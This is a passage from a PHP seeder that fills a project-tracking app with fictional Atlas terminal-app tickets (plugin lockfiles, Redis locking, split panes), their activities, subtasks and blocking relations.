- [ ] Automatic sha256 checksum lockfile generated at `~/.config/atlas/plugins.lock`.',
                'status' => 'new',
                'priority' => 'normal',
                'points' => 3,
                'requester' => 'sarah',
                'assignee' => 'marcus',
                'due_days' => 22,
                'days_ago' => 1,
                'tags' => ['cli', 'plugins', 'packaging', 'cosign'],
            ],
            [
                'key' => 'ATLAS-307',
                'area' => 'cloud-sync',
                'cycle' => $cycle14,
                'title' => 'Distributed locking for concurrent workspace file edits via Redis Redlock',
                'description' => '### Distributed Architecture

When teams share an Atlas Cloud Workspace, prevent accidental file overwrite collisions by managing advisory leases using the distributed Redlock algorithm.

#### Acceptance Criteria
- [ ] Safe TTL renewals during active developer keystroke stream.
- [ ] Visual indicator shows: *"Marcus Vance is editing Cargo.toml"*.',
                'status' => 'new',
                'priority' => 'normal',
                'points' => 5,
                'requester' => 'marcus',
                'assignee' => 'elena',
                'due_days' => 21,
                'days_ago' => 1,
                'tags' => ['redis', 'redlock', 'concurrency', 'cloud'],
            ],
            [
                'key' => 'ATLAS-308',
                'area' => 'ui-renderer',
                'cycle' => $cycle14,
                'title' => 'Split pane layout engine: support arbitrary vertical, horizontal, and grid snapping',
                'description' => '### Architecture & Refactoring

Replace the legacy split-pane tree with a lightweight binary space partition (BSP) algorithm supporting custom aspect ratio presets and keyboard layout serialization.

#### Acceptance Criteria
- [ ] Persist window split geometry in workspace session state.
- [ ] Keyboard hotkeys for pane swap (`⌘⇧H/J/K/L`) and equal balance (`⌘=`).',
                'status' => 'ready',
                'priority' => 'normal',
                'points' => 3,
                'requester' => 'david',
                'assignee' => 'david',
                'due_days' => 16,
                'days_ago' => 1,
                'tags' => ['layout', 'bsp', 'panes', 'ux'],
            ],
        ];

        // 7. Seed Tickets, Relations, Subtasks, and Realistic Activities
        $createdMap = collect();

        foreach ($tickets as $ticketData) {
            $area = $areas->get($ticketData['area']);
            if (! $area) {
                continue;
            }

            $requester = $users->get($ticketData['requester']) ?? $owner;
            $assignee = isset($ticketData['assignee']) ? $users->get($ticketData['assignee']) : null;
            $daysAgo = $ticketData['days_ago'] ?? 1;
            $dueDate = isset($ticketData['due_days'])
                ? now()->addDays($ticketData['due_days'])->toDateString()
                : null;

            $createdAt = now()->subDays($daysAgo)->subHours(rand(1, 10));
            $completedDaysAgo = $ticketData['completed_days_ago'] ?? null;
            $updatedAt = $completedDaysAgo !== null
                ? now()->subDays($completedDaysAgo)->subHours(rand(1, 5))
                : now()->subDays(max(0, $daysAgo - 1))->subHours(rand(1, 4));

            $request = WorkRequest::query()->updateOrCreate(
                [
                    'workspace_id' => $workspace->id,
                    'title' => $ticketData['title'],
                ],
                [
                    'area_id' => $area->id,
                    'cycle_id' => $ticketData['cycle']?->id,
                    'description' => $ticketData['description'],
                    'status' => $ticketData['status'],
                    'priority' => $ticketData['priority'],
                    'story_points' => $ticketData['points'] ?? 3,
                    'requester_id' => $requester->id,
                    'assignee_id' => $assignee?->id,
                    'due_date' => $dueDate,
                    'tags' => $ticketData['tags'] ?? [],
                    'is_blocked' => $ticketData['is_blocked'] ?? false,
                    'blocked_reason' => $ticketData['blocked_reason'] ?? null,
                    'created_at' => $createdAt,
                    'updated_at' => $updatedAt,
                ]
            );

            $createdMap->put($ticketData['key'], $request);

            // Record creation activity
            if (! RequestActivity::query()->where('request_id', $request->id)->where('type', 'created')->exists()) {
                RequestActivity::query()->create([
                    'request_id' => $request->id,
                    'user_id' => $requester->id,
                    'type' => 'created',
                    'body' => 'Work request created.',
                    'created_at' => $createdAt,
                ]);
            }

            // Record status change activity for completed tickets to power realistic burndown
            if ($ticketData['status'] === 'done') {
                $statusTime = $completedDaysAgo !== null ? now()->subDays($completedDaysAgo) : $updatedAt;
                if (! RequestActivity::query()->where('request_id', $request->id)->where('type', 'status_changed')->exists()) {
                    RequestActivity::query()->create([
                        'request_id' => $request->id,
                        'user_id' => ($assignee ?? $requester)->id,
                        'type' => 'status_changed',
                        'body' => 'Status changed to done.',
                        'metadata' => ['from' => 'review', 'to' => 'done'],
                        'created_at' => $statusTime,
                    ]);
                }
            }

            // Record blocker activity
            if (! empty($ticketData['is_blocked']) && ! RequestActivity::query()->where('request_id', $request->id)->where('type', 'blocked')->exists()) {
                RequestActivity::query()->create([
                    'request_id' => $request->id,
                    'user_id' => $requester->id,
                    'type' => 'blocked',
                    'body' => 'Roadblock flagged on ticket.',
                    'metadata' => ['reason' => $ticketData['blocked_reason']],
                    'created_at' => $createdAt->copy()->addHours(2),
                ]);
            }

            // Record comments & AI Agent notes
            if (! empty($ticketData['comments'])) {
                foreach ($ticketData['comments'] as $c) {
                    $commentUser = $users->get($c['user']) ?? $owner;
                    $commentTime = $createdAt->copy()->addHours($c['hours_after'] ?? 4);

                    if (! RequestActivity::query()->where('request_id', $request->id)->where('body', $c['body'])->exists()) {
                        RequestActivity::query()->create([
                            'request_id' => $request->id,
                            'user_id' => $commentUser->id,
                            'type' => ! empty($c['is_agent']) ? 'agent_action' : 'comment',
                            'body' => $c['body'],
                            'metadata' => ! empty($c['is_agent']) ? ['is_agent' => true, 'model' => 'Relay AI Agent v2.4'] : null,
                            'created_at' => $commentTime,
                        ]);
                    }
                }
            }

            // Record subtasks
            if (! empty($ticketData['subtasks'])) {
                foreach ($ticketData['subtasks'] as $subtaskData) {
                    $subAssignee = isset($subtaskData['assignee']) ? $users->get($subtaskData['assignee']) : $assignee;

                    WorkRequest::query()->updateOrCreate(
                        [
                            'workspace_id' => $workspace->id,
                            'parent_id' => $request->id,
                            'title' => $subtaskData['title'],
                        ],
                        [
                            'area_id' => $area->id,
                            'cycle_id' => $ticketData['cycle']?->id,
                            'status' => $subtaskData['status'] ?? 'new',
                            'priority' => 'normal',
                            'story_points' => $subtaskData['points'] ?? 1,
                            'requester_id' => $requester->id,
                            'assignee_id' => $subAssignee?->id,
                            'created_at' => $createdAt->copy()->addMinutes(30),
                        ]
                    );
                }
            }
        }

        // 8. Seed Relations / Blocking Dependencies
        // ATLAS-202 (Windows ConPTY leak) blocks ATLAS-204 (WASM plugin isolation)
        $t202 = $createdMap->get('ATLAS-202');
        $t204 = $createdMap->get('ATLAS-204');
        if ($t202 && $t204) {
            RequestRelation::query()->firstOrCreate([
                'request_id' => $t202->id,
                'related_id' => $t204->id,
                'type' => 'blocks',
            ]);
        }

        // ATLAS-201 (WebGL2 Glyph thrashing) blocks ATLAS-304 (HDR wide-gamut)
        $t201 = $createdMap->get('ATLAS-201');
        $t304 = $createdMap->get('ATLAS-304');
        if ($t201 && $t304) {
            RequestRelation::query()->firstOrCreate([
                'request_id' => $t201->id,
                'related_id' => $t304->id,
                'type' => 'blocks',
            ]);
        }

        // ATLAS-203 (PKCS#11 YubiKey) relates to ATLAS-305 (Defensive sandboxing)
        $t203 = $createdMap->get('ATLAS-203');
        $t305 = $createdMap->get('ATLAS-305');
        if ($t203 && $t305) {
            RequestRelation::query()->firstOrCreate([
                'request_id' => $t203->id,
                'related_id' => $t305->id,
                'type' => 'relates_to',
            ]);
        }

        return $workspace;
    }
}
